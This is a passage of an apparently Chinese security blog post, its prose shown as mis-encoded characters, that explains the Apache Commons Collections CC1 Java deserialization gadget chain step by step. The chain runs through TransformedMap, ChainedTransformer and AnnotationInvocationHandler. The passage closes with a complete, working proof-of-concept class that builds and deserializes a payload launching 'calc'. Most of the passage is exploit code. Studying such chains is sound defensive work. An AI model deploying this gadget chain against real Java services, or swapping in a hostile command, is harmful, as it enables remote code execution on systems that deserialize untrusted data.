class="line">invokerTransformer.transform(Runtime.getRuntime());</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ï¼Œå¯»æ‰¾è°ƒç”¨äº†<code>transform</code>çš„ç±»æˆ–å®ä¾‹ï¼Œåœ¨<code>TransformedMap</code>ç±»ä¸‹çš„<code>checkSetValue()</code>æ–¹æ³•å­˜åœ¨</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.valueTransformer.transform(value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å¯æƒœï¼Œè¯¥æ–¹æ³•åŠè¯¥ç±»çš„æ„é€ å™¨éƒ½è¢«<code>protected</code>ä¿®é¥°ï¼Œæ— æ³•åœ¨ç±»å¤–è°ƒç”¨ï¼Œä½†æ˜¯å¾€ä¸Šç¿»å¯ä»¥çœ‹åˆ°ä¸€ä¸ª<code>decorate()</code>æ–¹æ³•å¯ä»¥å¯¹<code>valueTransformer</code>è¿›è¡Œèµ‹å€¼</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å…ˆå¯¹ç°æœ‰çš„é“¾è¿›è¡ŒåŒ…è£…</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object, Object&gt;();</span><br><span class="line">map.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,invokerTransformer);</span><br></pre></td></tr></table></figure><p>ä¸‹ä¸€æ­¥æ˜¯æ‰¾åˆ°èƒ½è§¦å‘<code>checkSetValue()</code>æ–¹æ³•çš„æœºä¼šï¼Œä»<code>MapEntry</code>ç±»çš„<code>setValue()</code>æ–¹æ³•é‡Œçœ‹åˆ°äº†</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">            value = <span class="built_in">this</span>.parent.checkSetValue(value);</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.entry.setValue(value);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>ç®€å•è¯´çš„è¯ï¼Œæˆ‘ä»¬ä»<code>TransformedMap</code>é‡Œéå†å‡ºçš„å…ƒç´ å°±æ˜¯<code>MapEntry</code>çš„å®ä¾‹ï¼Œæ‰€ä»¥å¯ä»¥ç”¨forå¢å¼ºæå–å‡ºå•ä¸ª<code>entry</code>å»ä½¿ç”¨<code>setValue()</code>æ–¹æ³•ï¼Œå¤„ç†å®Œåçš„é“¾</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object, Object&gt;();</span><br><span class="line">map.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,invokerTransformer);</span><br><span class="line"><span class="keyword">for</span>(Map.Entry&lt;Object,Object&gt; entry : transformedMap.entrySet()) &#123;</span><br><span class="line">    entry.setValue(Runtime.getRuntime());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¦ç»†ç‚¹è¯´ï¼Œ<code>transformedMap</code>åœ¨éå†è°ƒç”¨<code>entrySet()</code>æ—¶ï¼Œä½¿ç”¨äº†çˆ¶ç±»é‡å†™çš„<code>entrySet()</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Set <span class="title function_">entrySet</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (Set)(<span class="built_in">this</span>.isSetValueChecking() ? <span class="keyword">new</span> <span class="title class_">EntrySet</span>(<span class="built_in">this</span>.map.entrySet(), <span class="built_in">this</span>) : <span class="built_in">this</span>.map.entrySet());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è€Œè¿™é‡Œè°ƒç”¨çš„<code>isSetValueChecking()</code>æ˜¯<code>transformedMap</code>è‡ªå·±çš„<code>isSetValueChecking()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">isSetValueChecking</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.valueTransformer != <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å¾€å‰è°ƒç”¨<code>decorate()</code>æ–¹æ³•æ—¶ï¼Œ<code>valueTransformer</code>è¢«èµ‹å€¼ä¸º<code>invokerTransformer</code>ï¼Œæ‰€ä»¥<code>isSetValueChecking()</code>ä¼šè¿”å›<code>true</code>ï¼Œå¯¹åº”åˆ°<code>entrySet()</code>é‡Œå°±æ˜¯è¿”å›åŒ…è£…åçš„<code>EntrySet</code>å®ä¾‹</p><p>åœ¨for-eachå¾ªç¯ä¸­ï¼Œä¼šéšå¼è°ƒç”¨è¿™ä¸ªè‡ªå®šä¹‰ <code>EntrySet</code> çš„ <code>iterator()</code> æ–¹æ³•ï¼Œè¯¥æ–¹æ³•è¿”å›ä¸€ä¸ª <code>EntrySetIterator</code> å®ä¾‹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Iterator <span class="title function_">iterator</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">EntrySetIterator</span>(<span class="built_in">this</span>.collection.iterator(), <span class="built_in">this</span>.parent);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>å½“<code>EntrySetIterator</code>å°è¯•ä½¿ç”¨<code>next()</code>æ–¹æ³•è·å–ä¸‹ä¸€ä¸ªå…ƒç´ æ—¶ï¼Œè¯¥æ–¹æ³•è¿”å›çš„æ˜¯ä¸€ä¸ª<code>MapEntry</code>ç±»å‹çš„å®ä¾‹ï¼Œè¿™å°±æ˜¯èƒ½æ‹¿åˆ°<code>MapEntry</code>çš„å…¨è¿‡ç¨‹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">next</span><span class="params">()</span> &#123;</span><br><span class="line">            Map.<span class="type">Entry</span> <span class="variable">entry</span> <span class="operator">=</span> (Map.Entry)<span class="built_in">this</span>.iterator.next();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MapEntry</span>(entry, <span class="built_in">this</span>.parent);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿”å›çš„<code>MapEntry</code>çš„<code>parent</code>å±æ€§æ¥æºäº<code>EntrySetIterator</code>çš„<code>parent</code>ï¼Œè€Œ<code>EntrySetIterator</code>çš„<code>parent</code>æ¥è‡ªäº<code>EntrySet</code>çš„<code>parent</code>ï¼Œ<code>EntrySet</code>ç”±<code>AbstractInputCheckedMapDecorator</code>ç±»çš„<code>entrySet()</code>æ–¹æ³•äº§ç”Ÿï¼Œåœ¨æ„å»ºæ—¶ç»™<code>parent</code>ä¼ é€’çš„å°±æ˜¯<code>AbstractInputCheckedMapDecorator</code>ç±»å‹ï¼Œå¯¹åº”åˆ°é“¾ä¸­ï¼Œéå†ç”±<code>transformedMap</code>å‘èµ·ï¼Œè€Œ<code>transformedMap</code>çš„ç±»æ˜¯<code>TransformedMap</code>ï¼Œç»§æ‰¿äº<code>AbstractInputCheckedMapDecorator</code>ç±»ï¼Œæ‰€ä»¥æœ€å<code>MapEntry</code>æ‰§è¡Œçš„<code>setValue()</code>å®é™…å°±æ˜¯<code>transformedMap.checkSetValue()</code></p><blockquote><p>å¦‚æœå•å•çŸ¥é“éå†è¿‡ç¨‹è¿”å›äº†ä¸€ä¸ªMapEntryå€’è¿˜å¥½ï¼Œä½†æ˜¯è¦æº¯æºè¿™ä¸€æ•´ä¸ªè¿‡ç¨‹å±å®å¾ˆå›°éš¾ï¼Œå…¶ä¸­æ¶‰åŠåˆ°å¾ˆå¤šç»§æ‰¿å…³ç³»å’Œå®ç°ç±»ä¸æ¥å£ï¼Œå®Œå…¨çš„æŠ½è±¡ï¼Œè¿™å¾ˆJava</p></blockquote><p>æ¥ä¸‹æ¥ç»§ç»­å¯»æ‰¾<code>setValue()</code>çš„ä¸Šå±‚ï¼Œå‘ç°åœ¨<code>AnnotationInvocationHandler</code>ç±»çš„<code>readObject()</code>æ–¹æ³•ä¸­è°ƒç”¨äº†<code>setValue()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var10 = AnnotationType.getInstance(<span class="built_in">this</span>.type);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var10.memberTypes();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(Map.Entry var5 : <span class="built_in">this</span>.memberValues.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();</span><br><span class="line">            <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);</span><br><span class="line">            <span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var10.members().get(var6)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œ<code>var5</code>æ˜¯ä»å±æ€§<code>this.memberValues</code>éå†å‡ºæ¥çš„ï¼Œè·Ÿæˆ‘ä»¬å…ˆå‰çš„æ„é€ æœ‰å¼‚æ›²åŒå·¥ä¹‹å¦™ï¼Œä¸‹é¢çœ‹<code>memberValues</code>æ˜¯ä»æ„é€ å™¨ä¸­è¢«èµ‹å€¼çš„</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">        Class[] var3 = var1.getInterfaces();</span><br><span class="line">        <span class="keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="number">1</span> &amp;&amp; var3[<span class="number">0</span>] == Annotation.class) &#123;</span><br><span class="line">            <span class="built_in">this</span>.type = var1;</span><br><span class="line">            <span class="built_in">this</span>.memberValues = var2;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯<code>AnnotationInvocationHandler</code>ç±»çš„ä¿®é¥°ç¬¦æ˜¯<code>default</code>ï¼Œæ— æ³•åœ¨åŒ…å¤–è°ƒç”¨ï¼Œéœ€è¦åˆ©ç”¨åå°„å»å®ä¾‹åŒ–å®ƒ</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Override.class,transformedMap)</span><br></pre></td></tr></table></figure><p>ç†è®ºä¸Šç›´æ¥å¾€<code>var2</code>ä¼ <code>transformedMap</code>åé¢çš„<code>var5</code>å°±æ˜¯éœ€è¦çš„<code>MapEntry</code>ï¼Œä½†æ˜¯è¦æ‰§è¡Œåˆ°<code>var5.setValue()</code>è¿˜æœ‰ä¸¤å±‚ifåˆ¤æ–­éœ€è¦å¤„ç†</p><blockquote><p>æ ¹æ®<code>String var6 = (String)var5.getKey()</code>ï¼Œ<code>var6</code>æ˜¯ä»<code>this.memberValues</code>æå–å‡ºçš„é”®å</p></blockquote><p>é¦–å…ˆè¦æ±‚<code>var7</code>ä¸ä¸ºç©ºã€‚<code>var7</code>çš„æ¥å†æ˜¯<code>var10 = AnnotationType.getInstance(this.type)</code> -&gt; <code>Map var3 = var10.memberTypes()</code> -&gt; <code>Class var7 = (Class)var3.get(var6)</code>ï¼Œè¿™é‡Œé¦–å…ˆä»<code>this.type</code>å±æ€§è·å¾—è¯¥æ³¨è§£ç±»å¯¹åº”çš„ã€å…¨å±€å”¯ä¸€çš„ <code>AnnotationType</code> å®ä¾‹ï¼Œå†ä»è¯¥å®ä¾‹ä¸­è·å–ä¸€ä¸ªMapï¼Œè¯¥Mapå­˜å‚¨äº†æ³¨è§£ä¸­æ¯ä¸ªæˆå‘˜çš„åå­—å’Œè¯¥æˆå‘˜è¢«å®šä¹‰çš„ç±»å‹ï¼Œå†ä»Mapä¸­è·å–é”®ä¸º<code>var6</code>çš„å€¼å¼ºè½¬ä¸ºObjectèµ‹ç»™<code>var7</code>ã€‚è€Œè¦æ±‚<code>var7</code>ä¸ä¸ºç©ºï¼Œå®é™…åˆ™æŒ‡ä¼ å…¥ <code>memberValues</code> çš„é”®åï¼Œå¿…é¡»æ˜¯ç›®æ ‡æ³¨è§£ä¸­å­˜åœ¨çš„æˆå‘˜åç§°</p><p>åœ¨<code>Action</code>æ³¨è§£ä¸­ï¼Œæœ‰å¥½å‡ ä¸ªæˆå‘˜</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Action &#123; </span><br><span class="line">    String <span class="title function_">input</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    String <span class="title function_">output</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    FaultAction[] fault() <span class="keyword">default</span> &#123; &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŠŠå…ˆå‰<code>map.put(&quot;key&quot;, &quot;value&quot;)</code>ä¸­çš„<code>key</code>æ”¹ä¸ºä»»æ„ä¸€ä¸ªï¼ˆå¦‚<code>input</code>ï¼‰å³å¯é€šè¿‡æ£€æŸ¥</p><p>ç¬¬äºŒå±‚ifåˆ¤æ–­ï¼Œè¦æ±‚<code>var8</code>ä¸æ˜¯<code>var7</code>ç±»å‹å’Œ<code>ExceptionProxy</code>ç±»å‹çš„å®ä¾‹ï¼Œè¿™é‡Œçš„<code>var7</code>ç»è¿‡ä¸Šé¢çš„å¼ºè½¬æ˜¯ä¸€ä¸ªClassç±»å‹ï¼Œ<code>var8</code>ä»<code>Object var8 = var5.getValue()</code>è€Œæ¥ï¼Œå› ä¸ºæˆ‘é€‰æ‹©äº†<code>Action</code>æ³¨è§£çš„<code>input</code>æˆå‘˜ï¼Œæ­¤å¤„æŠŠputè¿‡å»çš„å€¼å˜æˆæ•°å­—å°±èƒ½é€šè¿‡äº†</p><p>é€šè¿‡ifåˆ¤æ–­åï¼Œ<code>setValue()</code>è¯­å¥é•¿è¿™æ ·</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var10.members().get(var6)));</span><br></pre></td></tr></table></figure><p>æ­£å¸¸è¯´ï¼Œåº”è¯¥è®©<code>setValue()</code>çš„å‚æ•°ä¸º<code>Runtime.getRuntime()</code>ï¼Œè€Œæ­¤å¤„çš„å‚æ•°è¢«å®šä¹‰ä¸ºäº†ä¸€é•¿ä¸²æ— æ³•æ§åˆ¶çš„å‚æ•°</p><p>å®é™…ä¸Šï¼Œæ‰§è¡Œ<code>setValue()</code>çš„æ„ä¹‰åœ¨äºæ‰§è¡Œ<code>checkSetValue()</code>ï¼Œæ‰§è¡Œ<code>checkSetValue()</code>çš„æ„ä¹‰åœ¨äºæ‰§è¡Œ<code>transformedMap</code>ä¸­çš„<code>this.valueTransformer.transform()</code>ï¼Œå¯ä»¥å¯»æ‰¾ä¸€ä¸ªç±»ï¼Œè®©å…¶æ‰§è¡Œ<code>transform()</code>ä¸å‚æ•°æ— å…³ï¼Œè€Œæ­£å¥½æœ‰ä¸€ä¸ª<code>ConstantTransformer</code>æ»¡è¶³æ¡ä»¶ï¼Œå®ƒçš„<code>transform()</code>è¢«æ–¹æ³•é‡å†™ä¸º</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿”å›å€¼å®Œå…¨ä¸<code>input</code>æ— å…³ï¼Œç›´æ¥è¿”å›äº†å±æ€§<code>iConstant</code>ï¼Œè¯¥å±æ€§åœ¨æ„å»ºæ—¶è¢«èµ‹å€¼</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™ä¸ªç±»åªèƒ½åšåˆ°è¿”å›ï¼Œä¸èƒ½å»æ‰§è¡Œï¼Œè¿˜éœ€è¦ä¸€ä¸ªèƒ½å¤Ÿåè°ƒ<code>ConstantTransformer</code>å’Œ<code>invokerTransformer</code>æ‰§è¡Œ<code>transform()</code>æ–¹æ³•çš„å·¥å…·</p><p>åœ¨<code>ChainedTransformer</code>è¿™ä¸ªç±»ä¸­ï¼Œå…¶é‡å†™çš„<code>transform()</code>æ–¹æ³•å¾ˆæœ‰æ„æ€</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">            object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>iTransformers</code>æ˜¯ä¸€ä¸ªå­˜å‚¨äº†<code>Transformer</code>å¯¹è±¡çš„æ•°ç»„ï¼Œåœ¨æ„å»ºæ—¶è¢«èµ‹å€¼</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iTransformers = transformers;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>ChainedTransformer</code>çš„<code>transform()</code>æ–¹æ³•ä»<code>iTransformers</code>æ•°ç»„ä¸­é€ä¸ªéå†å‡º<code>Transformer</code>å¯¹è±¡å¹¶æ‰§è¡Œå®ƒä»¬çš„<code>transform()</code>æ–¹æ³•ï¼Œå¹¶æŠŠä¸Šä¸€ä¸ª<code>transform()</code>æ–¹æ³•æ‰§è¡Œå®Œçš„è¿”å›å€¼å½“ä½œä¸‹ä¸€ä¸ª<code>transform()</code>çš„å‚æ•°</p><p>åœ¨æ„å»ºtransformeræ•°ç»„å‰è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œ<code>Runtime</code>æ²¡æœ‰æ¥å…¥<code>Serializable</code>æ¥å£ï¼Œä¸èƒ½è¢«åºåˆ—åŒ–ã€‚æ‰€ä»¥åœ¨æ„å»ºtransformeræ•°ç»„æ—¶æ‰§è¡Œçš„å‘½ä»¤é“¾åº”è¯¥æ˜¯åˆ©ç”¨åå°„å®ä¾‹åŒ–<code>Runtime</code></p><p>å¦‚æœ<code>chainedTransformer</code>èƒ½æ„å»ºå‡ºè¿™æ ·çš„<code>iTransformers</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),&#125;;</span><br></pre></td></tr></table></figure><p>å°†<code>chainedTransformer</code>ä½œä¸º<code>valueTransformer</code>æ‰§è¡Œ<code>decorate()</code>ï¼Œé‚£ä¹ˆæœ€åæ‰§è¡Œåˆ°<code>setValue()</code>æ—¶ï¼Œæ— è®ºåœ¨<code>setValue()</code>ä¼ å…¥äº†ä»€ä¹ˆï¼Œéƒ½ä¼šè¢«ç¬¬ä¸€æ­¥<code>ConstantTransformer</code>æ‰§è¡Œ<code>transform()</code>å›ºå®šè¿”å›<code>Runtime.class</code>è¦†ç›–ï¼Œä¹‹åå°±æ˜¯å‘½ä»¤é“¾æ¡çš„æ‰§è¡Œ</p><p>æœ€åçš„ååºåˆ—åŒ–é“¾ï¼Œæ‰§è¡Œè‡ªåŠ¨è§¦å‘è®¡ç®—å™¨</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object, Object&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;input&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Action.class,transformedMap);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser1.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;ser1.bin&quot;</span>)));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(filename)));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ€»ç»“ä¸€ä¸‹ï¼Œåœ¨é“¾ä¸­ï¼Œä¸€ä¸ª<code>AnnotationInvocationHandler</code>å¯¹è±¡è¢«ååºåˆ—åŒ–ï¼Œè¿™ä¼šè§¦å‘å…¶<code>readObject()</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•å¯¹ä¼ å…¥çš„<code>transformedMap</code>è°ƒç”¨äº†<code>setValue()</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•åˆè°ƒç”¨äº†<code>checkSetValue()</code>ï¼Œ<code>checkSetValue()</code>çš„æ‰§è¡Œåˆè°ƒç”¨äº†<code>transformedMap</code>ä¸­çš„<code>this.valueTransformer.transform()</code>ï¼Œå®é™…ä¸Šå°±æ˜¯<code>chainedTransformer.transform()</code>ï¼Œè¯¥æ–¹æ³•ç¬¬ä¸€å±‚æ— è§†äº†å‚æ•°ï¼Œç›´æ¥è¿”å›<code>Runtime.class</code>ï¼Œä¹‹åçš„<code>transform()</code>é€šè¿‡é“¾å¼æ‰§è¡Œé€ æˆäº†æ¶æ„å‘½ä»¤è§¦å‘</p><figure class="highlight txt"><table><tr><td 